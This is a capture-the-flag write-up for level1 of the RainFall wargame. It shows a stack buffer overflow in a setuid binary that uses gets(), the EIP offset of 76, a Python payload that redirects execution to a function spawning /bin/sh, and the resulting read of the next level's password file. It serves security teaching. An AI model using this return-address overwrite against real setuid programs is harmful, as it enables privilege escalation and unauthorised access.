# Level1
  
List the files will show us 'level1' executable
```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$
```
The program wait an input and quit after press enter
```
level1@RainFall:~$ ./level1
a
level1@RainFall:~$ ./level1 test
423
level1@RainFall:~$
```
After analyze it with gdb we can see that there is two principal function : `main` and `run`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level1/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level1/source.c) for more details.  
The `run` function use `fwrite` to display "Good... Wait what?\n" in the standard output stream (stdout). Then execute the shell command `/bin/sh` using `system`.  
The `main` function uses gets to receive user input who is vunerable to buffer overflow exploit.  
<br/>

By overwriting the RET value with the address of run() we can force its execution.  
Let's try to get the offset of `eip` with the pattern generator :  
```
level1@RainFall:~$ python -c 'print "a" * 80' > /tmp/exploit
level1@RainFall:~$ gdb ./level1 
(gdb) r < /tmp/exploit
Starting program: /home/user/level1/level1 < /tmp/exploit

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb)
```
We found an offset of 76. Let's build our exploit :  
input = padding (76 bytes) + address of `run()`  
Address of the `run()` function : 0x08048444 (don't forget to reverse for little-endian).
```
level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
```
But as we need to execute this through a pipe, `/bin/sh` is non-interactive and will automatically shutdown because it will try to read stdin and will see EOF. It exits, because that's what programs that get EOF on input are supposed to do.  
We have a little trick with cat to keep stdin open, so `/bin/sh` will keep listening to stdin and execute whatever is sent through it.  
*[Open a shell from a pipelined process](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process) *
```
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$ su level2
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$
```
Level1 passed!
